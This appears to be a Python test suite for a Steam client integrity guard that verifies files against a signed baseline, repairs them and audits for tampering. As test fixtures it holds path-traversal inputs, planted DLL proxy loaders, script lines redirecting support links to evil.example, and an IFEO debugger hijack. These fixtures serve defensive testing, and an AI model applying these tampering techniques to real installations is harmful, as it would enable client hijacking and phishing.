from __future__ import annotations
import base64
import hashlib
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
import zipfile

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from sentinel.core import (SafetyError, OfficialClient, Repairer, canonical,
    local_identity, parse_kv, read_signed_seed, safe_relative, safe_target, sha256, verify)


def pe_bytes(machine=0x8664):
    data = bytearray(256)
    data[:2] = b"MZ"
    data[0x3C:0x40] = (128).to_bytes(4, "little")
    data[128:134] = b"PE\0\0" + machine.to_bytes(2, "little")
    return bytes(data)


class SecurityTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.root = self.base / "Steam"
        self.root.mkdir()
        (self.root / "package").mkdir()
        (self.root / "package/steam_client_win64.manifest").write_text('"win64" { "version" "100" }')
        self.good = {"steam.exe": pe_bytes(), "steamclient64.dll": b"trusted-DLL",
                     "bin/steamwebhelper.exe": b"trusted-helper"}
        self.archive = self.base / "official.zip"
        with zipfile.ZipFile(self.archive, "w") as z:
            for name, data in self.good.items():
                z.writestr(name, data)
                target = self.root / name
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(data)
        self.ref = {"platform": "win64", "channel": "stable", "version": "100",
                    "packages": {"test": {"file": "test.zip.abc", "sha256": sha256(self.archive),
                                           "size": self.archive.stat().st_size}}, "files": {}}
        for name, data in self.good.items():
            self.ref["files"][name] = {"sha256": hashlib.sha256(data).hexdigest(), "size": len(data),
                                       "package": "test", "member": name}
        self.state = self.base / "state"
        self.client = OfficialClient(self.base / "cache")
        # Fake verified package retrieval: no network and no actual Steam operations.
        self.client.package = lambda info, root=None: self.archive

    def test_matching_version_passes(self):
        result = verify(self.root, self.ref)
        self.assertEqual((result.state, result.checked), ("clean", 3))

    def test_tampering_is_detected(self):
        (self.root / "steamclient64.dll").write_bytes(b"attacker")
        self.assertEqual(verify(self.root, self.ref).mismatches, ["steamclient64.dll"])

    def test_latest_version_not_equal_is_unknown(self):
        ref = {**self.ref, "version": "200"}
        self.assertEqual(verify(self.root, ref).state, "unknown")

    def test_changes_during_hash_are_not_confirmed(self):
        original = sha256
        changed = False
        def changing(path):
            nonlocal changed
            value = original(path)
            if not changed:
                changed = True
                (self.root / "steamclient64.dll").write_bytes(b"updating")
            return value
        with patch("sentinel.core.sha256", side_effect=changing):
            self.assertEqual(verify(self.root, self.ref).state, "updating")

    def test_path_attacks_refused(self):
        for path in ("../escape.dll", "C:/x.dll", "\\\\server\\x.dll", "a/../../x", "file:ads",
                     "a//b", "a./x", "NUL.dll", "/x", "a/./x", "a/../x", "a /b"):
            with self.subTest(path=path), self.assertRaises(SafetyError):
                safe_relative(path)

    def test_nested_keyvalues(self):
        self.assertEqual(parse_kv('"x" { "y" { "file" "a.zip" } "version" "1" }')["x"]["y"]["file"], "a.zip")

    def test_malformed_keyvalues_refused(self):
        for text in ('"x" { "y" "z"', '"x" "1" "x" "2"', '}'):
            with self.assertRaises(SafetyError):
                parse_kv(text)

    def test_release_signature_tamper_detected(self):
        key = Ed25519PrivateKey.generate()
        assets = self.base / "assets"
        assets.mkdir()
        (assets / "release-public-key.txt").write_text(key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw).hex())
        envelope = {"payload": self.ref, "signature": base64.b64encode(key.sign(canonical(self.ref))).decode()}
        (assets / "baseline.json").write_text(json.dumps(envelope), encoding="utf-8")
        public = (assets / "release-public-key.txt").read_text()
        self.assertEqual(read_signed_seed(assets, public)["version"], "100")
        envelope["payload"]["version"] = "200"
        (assets / "baseline.json").write_text(json.dumps(envelope), encoding="utf-8")
        with self.assertRaises(Exception):
            read_signed_seed(assets, public)

    def test_repair_and_rollback(self):
        target = self.root / "steamclient64.dll"
        target.write_bytes(b"modified-before-repair")
        repairer = Repairer(self.root, self.state, self.client, self.ref)
        transaction = repairer.repair(["steamclient64.dll"])
        self.assertEqual(target.read_bytes(), self.good["steamclient64.dll"])
        self.assertEqual((transaction / "old/steamclient64.dll").read_bytes(), b"modified-before-repair")
        repairer.rollback(transaction)
        self.assertEqual(target.read_bytes(), b"modified-before-repair")

    def test_missing_bootstrapper_repairable(self):
        (self.root / "steam.exe").unlink()
        self.assertEqual(verify(self.root, self.ref).mismatches, ["steam.exe"])
        Repairer(self.root, self.state, self.client, self.ref).repair(["steam.exe"])
        self.assertEqual(verify(self.root, self.ref).state, "clean")

    def test_corrupt_bootstrapper_repairable(self):
        (self.root / "steam.exe").write_bytes(b"not-a-PE")
        self.assertEqual(verify(self.root, self.ref).state, "mismatch")
        Repairer(self.root, self.state, self.client, self.ref).repair(["steam.exe"])
        self.assertEqual(verify(self.root, self.ref).state, "clean")

    def test_failed_second_replacement_rolls_back_first(self):
        (self.root / "steam.exe").write_bytes(b"bad-exe")
        (self.root / "steamclient64.dll").write_bytes(b"bad-dll")
        repairer = Repairer(self.root, self.state, self.client, self.ref)
        calls = 0
        def stop_check():
            nonlocal calls
            calls += 1
            if calls == 2:
                raise SafetyError("simulated concurrent launch")
        with self.assertRaises(SafetyError):
            repairer.repair(["steam.exe", "steamclient64.dll"], stop_check)
        self.assertEqual((self.root / "steam.exe").read_bytes(), b"bad-exe")
        self.assertEqual((self.root / "steamclient64.dll").read_bytes(), b"bad-dll")

    def test_modified_backup_refused(self):
        (self.root / "steamclient64.dll").write_bytes(b"bad")
        r = Repairer(self.root, self.state, self.client, self.ref)
        transaction = r.repair(["steamclient64.dll"])
        (transaction / "old/steamclient64.dll").write_bytes(b"tampered-backup")
        with self.assertRaises(SafetyError):
            r.rollback(transaction)

    def test_unknown_file_repair_refused(self):
        with self.assertRaises(SafetyError):
            Repairer(self.root, self.state, self.client, self.ref).repair(["../x.dll"])

    def test_changed_installation_version_refused(self):
        (self.root / "package/steam_client_win64.manifest").write_text('"win64" { "version" "101" }')
        with self.assertRaises(SafetyError):
            Repairer(self.root, self.state, self.client, self.ref).repair(["steam.exe"])

    def test_beta_channel_refused(self):
        (self.root / "package/beta").write_text("publicbeta")
        with self.assertRaises(SafetyError):
            local_identity(self.root)

    def test_win32_refused(self):
        (self.root / "steam.exe").write_bytes(pe_bytes(0x14C))
        with self.assertRaises(SafetyError):
            local_identity(self.root)

    def test_quick_check_does_not_claim_full_coverage(self):
        (self.root / "bin/steamwebhelper.exe").write_bytes(b"tampered")
        self.assertEqual(verify(self.root, self.ref, quick=True).checked, 2)
        self.assertEqual(verify(self.root, self.ref).state, "mismatch")

    def test_symlink_target_refused_when_available(self):
        link = self.root / "linked"
        outside = self.base / "outside"
        outside.mkdir()
        try:
            link.symlink_to(outside, target_is_directory=True)
        except OSError:
            self.skipTest("Windows symlink creation privilege unavailable")
        with self.assertRaises(SafetyError):
            safe_target(self.root, "linked/x.dll")

    def make_engine(self):
        from sentinel.engine import Engine
        from types import SimpleNamespace
        class Emitter:
            def __init__(self):
                self.values = []
            def emit(self, value):
                self.values.append(value)
        signals = SimpleNamespace(log=Emitter(), alert=Emitter(), result=Emitter(), busy=Emitter())
        settings = {"steam_path": str(self.root), "auto_repair": False, "stop_on_mismatch": False}
        with patch("sentinel.engine.read_signed_seed", return_value=self.ref):
            engine = Engine(self.base, self.state, settings, signals)
        engine.client = self.client
        engine.shutdown.wait = lambda seconds: False
        return engine, signals

    def test_engine_old_trusted_version_is_not_malicious(self):
        engine, _ = self.make_engine()
        self.client.manifest = lambda: {**self.ref, "version": "200"}
        newref={**self.ref,'version':'200'}
        def updated(root,manifest):
            (self.root/'package/steam_client_win64.manifest').write_text('"win64" { "version" "200" }')
            engine.references['200']=newref
            return newref
        with patch('sentinel.updater.UpdateController.run',side_effect=updated) as controller:
            result, _, _ = engine.scan()
        controller.assert_called_once()
        self.assertEqual((result.state, result.version, result.latest), ("clean", "200", "200"))

    def test_engine_offline_matching_seed_usable(self):
        engine, _ = self.make_engine()
        self.client.manifest = lambda: (_ for _ in ()).throw(OSError("offline"))
        result, _, _ = engine.scan()
        self.assertEqual(result.state, "clean")
        self.assertIn("离线", result.detail)

    def test_engine_unknown_version_never_repairs(self):
        engine, _ = self.make_engine()
        (self.root / "package/steam_client_win64.manifest").write_text('"win64" { "version" "50" }')
        self.client.manifest = lambda: {**self.ref, "version": "200"}
        with patch("sentinel.engine.windows.stop_steam") as stop, patch('sentinel.updater.UpdateController.run',side_effect=SafetyError('unknown bootstrap')), self.assertRaises(SafetyError):
            engine.scan()
        stop.assert_not_called()

    def test_engine_verified_update_not_repaired(self):
        engine, _ = self.make_engine()
        engine.settings.update(auto_repair=True, stop_on_mismatch=True)
        self.client.manifest = lambda: self.ref
        from sentinel.updater import UpdateState
        engine.update_state = UpdateState(self.root, "200", phase="running", reference={**self.ref, "version": "200"})
        (self.root / "package/steam_client_win64").write_text("pending")
        (self.root / "steamclient64.dll").write_bytes(b"updating")
        with patch("sentinel.engine.windows.stop_steam") as stop:
            result, _, _ = engine.scan()
        self.assertEqual(result.state, "updating")
        stop.assert_not_called()
        self.assertEqual((self.root / "steamclient64.dll").read_bytes(), b"updating")

    def test_engine_confirmed_mismatch_auto_repaired(self):
        engine, _ = self.make_engine()
        engine.settings.update(auto_repair=True, stop_on_mismatch=True)
        self.client.manifest = lambda: self.ref
        (self.root / "steamclient64.dll").write_bytes(b"modified")
        with patch("sentinel.engine.windows.stop_steam") as stop, patch("sentinel.engine.windows.assert_stopped"):
            result, _, _ = engine.scan()
        stop.assert_called_once_with(self.root)
        self.assertEqual(result.state, "clean")
        self.assertEqual((self.root / "steamclient64.dll").read_bytes(), self.good["steamclient64.dll"])

    def test_engine_risky_loader_blocks_launch(self):
        engine, _ = self.make_engine()
        self.client.manifest = lambda: self.ref
        (self.root / "version.dll").write_bytes(b"unknown-plugin")
        with patch("sentinel.engine.windows.launch_steam") as launch, self.assertRaises(SafetyError):
            engine.launch()
        launch.assert_not_called()

    def test_engine_unverified_launcher_not_executed(self):
        engine, _ = self.make_engine()
        self.client.manifest = lambda: self.ref
        (self.root / "steam.exe").write_bytes(b"bad")
        with patch("sentinel.engine.windows.launch_steam") as launch, self.assertRaises(SafetyError):
            engine.launch()
        launch.assert_not_called()

    def test_cfg_disabled_controls_are_not_risky(self):
        from sentinel.audit import analyze_config
        data = b'BootStrapperInhibitAll=0\nDisableDownloads=false\n# ClientDownloadHost=evil\n'
        self.assertEqual(analyze_config(data), ([], data))

    def test_cfg_semantic_values_cleaned_preserving_other_settings(self):
        from sentinel.audit import analyze_config
        data = b'# comment\r\nBootStrapperInhibitAll=enable\r\nBootStrapperForceSelfUpdate=disable\r\nForceOfflineMode=1\r\nKeepThis=42\r\n'
        risky, clean = analyze_config(data)
        self.assertEqual(len(risky), 3)
        self.assertEqual(clean, b'# comment\r\nKeepThis=42\r\n')

    def test_cfg_utf16_preserved(self):
        from sentinel.audit import analyze_config
        data = 'BootStrapperInhibitAll=true\r\nKeep=中文\r\n'.encode('utf-16')
        self.assertEqual(analyze_config(data)[1].decode('utf-16'), 'Keep=中文\r\n')

    def test_nested_cef_forwarder_found(self):
        from sentinel.audit import ClientAuditor
        cef = self.root / 'bin/cef/cef.win64'
        cef.mkdir(parents=True)
        (cef / 'version.dll').write_bytes(b'proxy')
        (cef / 'versionOrg.dll').write_bytes(b'original')
        audit = ClientAuditor(lambda p: (False, '')).audit(self.root, self.ref)
        finding = next(f for f in audit.findings if f.rule == 'version-forwarder')
        self.assertEqual(set(finding.files), {'bin/cef/cef.win64/version.dll', 'bin/cef/cef.win64/versionorg.dll'})

    def test_game_loader_outside_client_dirs_ignored(self):
        from sentinel.audit import ClientAuditor
        game = self.root / 'steamapps/common/Game'
        game.mkdir(parents=True)
        (game / 'version.dll').write_bytes(b'legitimate-game-mod')
        self.assertFalse(ClientAuditor(lambda p: (False, '')).audit(self.root, self.ref).findings)

    def test_signed_extra_valve_loader_review_only(self):
        from sentinel.audit import ClientAuditor
        (self.root / 'version.dll').write_bytes(b'extra-valve-file')
        finding = ClientAuditor(lambda p: (True, 'Valve Corp.')).audit(self.root, self.ref).findings[0]
        self.assertFalse(finding.blocking)
        self.assertEqual(finding.action, 'review')

    def test_nonvalve_signed_loader_is_high_risk(self):
        from sentinel.audit import ClientAuditor
        (self.root / 'wsock32.dll').write_bytes(b'signed-loader')
        finding = ClientAuditor(lambda p: (True, 'Other Company')).audit(self.root, self.ref).findings[0]
        self.assertTrue(finding.blocking)

    def test_direct_and_variable_support_routes_detected(self):
        from sentinel.audit import script_signals
        for script in ('SupportMessages:"https://evil.example/support"',
                       'let link="https://help.steampowered.com.evil.example"; let x={HelpFrontPage:link};'):
            self.assertTrue(any(x[0] == 'support-route' for x in script_signals(script)))

    def test_official_support_route_and_ordinary_function_not_flagged(self):
        from sentinel.audit import script_signals
        script = 'SupportMessages:"https://help.steampowered.com/"; BHasActiveSupportAlerts(){return this.alerts.length>0;}'
        self.assertFalse(script_signals(script))

    def test_minified_forced_alert_detected(self):
        from sentinel.audit import script_signals
        self.assertTrue(script_signals('BHasActiveSupportAlerts(){return!0;}'))

    def test_game_action_redirection_detected(self):
        from sentinel.audit import script_signals
        script = 'OnGameActionUserRequest(a){ExecuteSteamURL("steam://open/supportalert");return;switch(a){}}'
        self.assertTrue(any(x[0] == 'game-support-redirect' for x in script_signals(script)))

    def test_js_cache_invalidated_for_restored_timestamps(self):
        from sentinel.audit import ClientAuditor
        import os
        ui = self.root / 'steamui'
        ui.mkdir()
        script = ui / 'hack.js'
        malicious = b'SupportMessages:"https://evil.example/"'
        script.write_bytes(b' ' * len(malicious))
        old = script.stat()
        auditor = ClientAuditor(lambda p: (False, ''))
        self.assertFalse(any(f.blocking for f in auditor.audit(self.root, self.ref).findings))
        script.write_bytes(malicious)
        os.utime(script, ns=(old.st_atime_ns, old.st_mtime_ns))
        auditor.invalidate({'steamui/hack.js'})
        self.assertTrue(any(f.blocking for f in auditor.audit(self.root, self.ref).findings))

    def test_known_official_script_suppresses_pattern_false_positive(self):
        from sentinel.audit import ClientAuditor
        ui = self.root / 'steamui'
        ui.mkdir()
        data = b'BHasActiveSupportAlerts(){return!0;}'
        (ui / 'official.js').write_bytes(data)
        ref = {**self.ref, 'files': {**self.ref['files'], 'steamui/official.js': {'sha256': hashlib.sha256(data).hexdigest()}}}
        self.assertFalse(ClientAuditor(lambda p: (False, '')).audit(self.root, ref).findings)

    def test_ifeo_and_silent_exit_audited_readonly(self):
        from sentinel.audit import registry_findings
        def reader(hive, view, path):
            if path.endswith('steam.exe') and 'Image File Execution' in path:
                return {'Debugger': 'evil.exe', 'GlobalFlag': '0x200'}
            return {}
        found = registry_findings(self.root, reader)
        self.assertTrue(any(f.rule == 'ifeo-debugger' for f in found))
        self.assertTrue(any(f.rule == 'silent-exit' for f in found))
        self.assertTrue(all(not f.files and f.action == 'review' for f in found))

    def test_risk_quarantine_and_cfg_rollback(self):
        from sentinel.audit import ClientAuditor, RiskRemediator
        (self.root / 'version.dll').write_bytes(b'proxy-evidence')
        config = b'BootStrapperInhibitAll=1\nKeep=42\n'
        (self.root / 'steam.cfg').write_bytes(config)
        found = ClientAuditor(lambda p: (False, '')).audit(self.root, self.ref)
        tx = RiskRemediator(self.root, self.state).apply(found.findings, lambda: None)
        self.assertFalse((self.root / 'version.dll').exists())
        self.assertEqual((self.root / 'steam.cfg').read_bytes(), b'Keep=42\n')
        self.assertEqual((tx / 'old/version.dll').read_bytes(), b'proxy-evidence')
        Repairer(self.root, self.state, self.client, self.ref).rollback(tx)
        self.assertEqual((self.root / 'version.dll').read_bytes(), b'proxy-evidence')
        self.assertEqual((self.root / 'steam.cfg').read_bytes(), config)

    def test_risk_quarantine_changed_evidence_refused(self):
        from sentinel.audit import ClientAuditor, RiskRemediator
        path = self.root / 'version.dll'
        path.write_bytes(b'first')
        found = ClientAuditor(lambda p: (False, '')).audit(self.root, self.ref)
        path.write_bytes(b'changed')
        with self.assertRaises(SafetyError):
            RiskRemediator(self.root, self.state).apply(found.findings, lambda: None)
        self.assertEqual(path.read_bytes(), b'changed')

    def test_guard_stops_before_any_network_and_queues_repair(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, auto_repair=True, stop_on_mismatch=True)
        (self.root / 'version.dll').write_bytes(b'proxy')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
        stop.assert_called_once_with(self.root)
        command, payload = engine.commands.get_nowait()
        self.assertEqual(command, 'incident')
        self.assertTrue((self.root / 'version.dll').exists(), 'Repair must not run before stop')
        with patch('sentinel.engine.windows.assert_stopped'), patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.handle_incident(payload)
        self.assertFalse((self.root / 'version.dll').exists())

    def test_guard_detects_known_file_change_without_three_second_wait(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        (self.root / 'steamclient64.dll').write_bytes(b'modified')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
        stop.assert_called_once()
        self.assertIn('steamclient64.dll', engine.commands.get_nowait()[1]['mismatches'])

    def test_pending_update_does_not_hide_structural_tampering(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        (self.root / 'package/steam_client_win64').write_text('pending')
        (self.root / 'versionOrg.dll').write_bytes(b'forwarder')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
        stop.assert_called_once()

    def test_guard_cached_package_marker_does_not_hide_trusted_file_tampering(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        (self.root / 'package/steam_client_win64').write_text('cached update metadata')
        (self.root / 'steamclient64.dll').write_bytes(b'modified')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
        stop.assert_called_once_with(self.root)
        self.assertIn('steamclient64.dll', engine.commands.get_nowait()[1]['mismatches'])

    def test_guard_lowercase_event_covers_mixed_case_trusted_name(self):
        from types import SimpleNamespace
        name = 'GameOverlayRenderer64.dll'
        target = self.root / name
        target.write_bytes(b'trusted-overlay')
        self.ref['files'][name] = {'sha256': sha256(target), 'size': target.stat().st_size, 'package': 'test', 'member': name}
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        engine.guard_root = self.root
        engine.guard_pids = {(100, 1.0)}
        target.write_bytes(b'modified-overlay')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(events=('gameoverlayrenderer64.dll',), watch=False)
        stop.assert_called_once_with(self.root)
        self.assertIn(name, engine.commands.get_nowait()[1]['mismatches'])

    def test_guard_detects_script_change_after_clean_scan_with_cached_marker(self):
        from types import SimpleNamespace
        import os
        name = 'steamui/1234.js'
        target = self.root / name
        target.parent.mkdir()
        target.write_bytes(b'window.value = 1;')
        self.ref['files'][name] = {'sha256': sha256(target), 'size': target.stat().st_size, 'package': 'test', 'member': name}
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        engine.scan(online=False, automatic=False)
        engine.guard_root = self.root
        engine.guard_pids = {(100, 1.0)}
        (self.root / 'package/steam_client_win64').write_text('cached metadata')
        old = target.stat()
        target.write_bytes(b'window.value = 2;')
        os.utime(target, ns=(old.st_atime_ns, old.st_mtime_ns))
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(events=(name,), watch=False)
        stop.assert_called_once_with(self.root)
        self.assertIn(name, engine.commands.get_nowait()[1]['mismatches'])

    def test_guard_preserves_controlled_official_update_hash_transition(self):
        from types import SimpleNamespace
        from sentinel.updater import UpdateState
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        engine.update_state = UpdateState(self.root, '100', phase='running', reference=self.ref)
        (self.root / 'steamclient64.dll').write_bytes(b'transition')
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
        stop.assert_not_called()

    def test_scan_cached_package_marker_does_not_hide_stable_mismatch(self):
        engine, _ = self.make_engine()
        engine.settings.update(auto_repair=True, stop_on_mismatch=True)
        self.client.manifest = lambda: self.ref
        (self.root / 'package/steam_client_win64').write_text('cached metadata')
        (self.root / 'steamclient64.dll').write_bytes(b'modified')
        with patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.assert_stopped'):
            result, _, _ = engine.scan()
        stop.assert_called_once_with(self.root)
        self.assertEqual(result.state, 'clean')
        self.assertEqual((self.root / 'steamclient64.dll').read_bytes(), self.good['steamclient64.dll'])

    def test_background_thread_init_failure_is_reported(self):
        from sentinel.core import SafetyError
        for name in ('worker', 'guard'):
            with self.subTest(name=name):
                engine, signals = self.make_engine()
                with patch('sentinel.engine.windows.ctypes.windll.shell32.IsUserAnAdmin', return_value=True), patch('sentinel.privilege.set_admin_default_owner', side_effect=SafetyError('fixture init failure')):
                    getattr(engine, 'run' if name == 'worker' else 'guard_run')()
                self.assertEqual(getattr(engine, name + '_state'), 'failed')
                self.assertTrue(any('fixture init failure' in text for text in signals.alert.values))

    def test_startup_scan_survives_immediate_audit_failure(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, root_confirmed=True)
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch.object(engine.guard_auditor, 'audit', side_effect=SafetyError('fixture audit failure')):
            with self.assertRaises(SafetyError):
                engine.guard_once(watch=False)
        self.assertTrue(engine.background_pending)
        self.assertTrue(engine.commands.empty())

    def test_background_request_is_executed_without_queue_commands(self):
        from sentinel.core import CheckResult
        import queue
        engine, _ = self.make_engine()
        engine.schedule_background_scan('fixture startup')
        engine.schedule_background_scan('duplicate startup')
        def scan():
            engine.shutdown.set()
            return CheckResult('clean', '100', checked=3), self.ref, []
        with patch.object(engine, 'initialize_worker', return_value=True), patch.object(engine.commands, 'get', side_effect=queue.Empty), patch.object(engine, 'scan', side_effect=scan) as call:
            engine.run()
        call.assert_called_once()
        self.assertFalse(engine.background_pending)

    def test_guard_detects_metadata_change_without_notification(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
            engine.background_pending = False
            (self.root / 'steamclient64.dll').write_bytes(b'modified-without-event')
            engine.last_guard_audit = 0
            engine.guard_once(watch=False)
        stop.assert_called_once_with(self.root)
        self.assertTrue(engine.background_pending)

    def test_failed_watcher_detects_same_metadata_tampering(self):
        from types import SimpleNamespace
        import os
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
            engine.watcher = SimpleNamespace(error='fixture watcher failure', thread=SimpleNamespace(is_alive=lambda: False), drain=lambda: set())
            target = self.root / 'steamclient64.dll'
            old = target.stat()
            target.write_bytes(b'X' * old.st_size)
            os.utime(target, ns=(old.st_atime_ns, old.st_mtime_ns))
            engine.last_guard_audit = 0
            engine.guard_once(watch=False)
        stop.assert_called_once_with(self.root)

    def test_periodic_guard_hash_covers_lost_same_metadata_event(self):
        from types import SimpleNamespace
        import os, time
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            engine.guard_once(watch=False)
            target = self.root / 'steamclient64.dll'
            old = target.stat()
            target.write_bytes(b'X' * old.st_size)
            os.utime(target, ns=(old.st_atime_ns, old.st_mtime_ns))
            engine.last_guard_full_hash = time.monotonic() - 61
            engine.last_guard_audit = 0
            engine.guard_once(watch=False)
        stop.assert_called_once_with(self.root)

    def test_real_fixture_process_launch_and_file_change_are_detected(self):
        import subprocess, time
        from sentinel import windows
        compiler = Path(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe')
        source = Path(__file__).with_name('SteamProcessFixture.cs')
        executable = self.root / 'steam.exe'
        subprocess.run([str(compiler), '/nologo', '/target:winexe', '/platform:x64', '/out:' + str(executable), str(source)], check=True, capture_output=True)
        self.ref['files']['steam.exe'].update(sha256=sha256(executable), size=executable.stat().st_size)
        (self.root / 'package/steam_client_win64').write_text('cached metadata')
        self.client.manifest = lambda: self.ref
        engine, signals = self.make_engine()
        engine.settings.update(monitor=True, root_confirmed=True, stop_on_mismatch=True, auto_repair=False)
        engine.guard_once(watch=True)
        self.assertTrue(engine.watcher.ready.wait(3))
        self.assertIsNone(engine.watcher.error)
        process = subprocess.Popen([str(executable)], cwd=self.root)
        try:
            deadline = time.monotonic() + 5
            while time.monotonic() < deadline and not windows.steam_processes(self.root):
                time.sleep(0.05)
            self.assertTrue(any(p.pid == process.pid for p in windows.steam_processes(self.root)))
            engine.guard_once(watch=True)
            self.assertTrue(engine.background_pending)
            engine.background_scan()
            self.assertEqual(engine.last_result.state, 'clean')
            self.assertTrue(any('后台完整校验结束' in text for text in signals.log.values))
            (self.root / 'steamclient64.dll').write_bytes(b'modified after clean scan')
            deadline = time.monotonic() + 5
            while time.monotonic() < deadline and process.poll() is None:
                engine.guard_once(watch=True)
                time.sleep(0.05)
            self.assertIsNotNone(process.poll(), 'Owned fixture process was not stopped after real file change')
            command, payload = engine.commands.get_nowait()
            self.assertEqual(command, 'incident')
            self.assertIn('steamclient64.dll', payload['mismatches'])
        finally:
            if process.poll() is None:
                process.terminate()
            process.wait(timeout=5)
            engine.watcher.closed.set()
            engine.watcher.thread.join(2)

    def test_guard_holds_relaunch_during_repair(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        engine.guard_root = self.root
        engine.active_incident = {'root': self.root}
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop:
            engine.guard_once(watch=False)
        stop.assert_called_once()

    def test_directory_watch_reports_timestamp_preserved_write(self):
        from sentinel.windows import DirectoryWatcher
        import os, time
        watcher = DirectoryWatcher(self.root)
        def close():
            watcher.closed.set()
            watcher.thread.join(2)
        self.addCleanup(close)
        self.assertTrue(watcher.ready.wait(3))
        self.assertIsNone(watcher.error)
        p = self.root / 'steamclient64.dll'
        old = p.stat()
        p.write_bytes(b'changed-data')
        os.utime(p, ns=(old.st_atime_ns, old.st_mtime_ns))
        found = set()
        until = time.monotonic() + 2
        while time.monotonic() < until and 'steamclient64.dll' not in found:
            found.update(watcher.drain())
            time.sleep(0.03)
        self.assertIn('steamclient64.dll', found)

    def test_guard_ignores_worker_audit_lock_and_network(self):
        from types import SimpleNamespace
        import threading
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
        (self.root / 'version.dll').write_bytes(b'proxy')
        self.client.manifest = lambda: (_ for _ in ()).throw(AssertionError('Guard attempted network'))
        process = SimpleNamespace(pid=100, create_time=lambda: 1.0, is_running=lambda: True)
        errors = []
        def call():
            try:
                engine.guard_once(watch=False)
            except Exception as e:
                errors.append(e)
        with patch('sentinel.engine.windows.steam_processes', return_value=[process]), patch('sentinel.engine.windows.stop_steam') as stop, patch('sentinel.engine.windows.registry_values', return_value={}):
            with engine.audit_lock:
                thread = threading.Thread(target=call)
                thread.start()
                thread.join(1)
                self.assertFalse(thread.is_alive(), 'Guard blocked behind worker audit lock')
            thread.join(2)
        self.assertFalse(errors)
        stop.assert_called_once()

    def test_guard_covers_nested_programs_on_new_session(self):
        from types import SimpleNamespace
        engine, _ = self.make_engine()
        engine.settings.update(monitor=True, stop_on_mismatch=True)
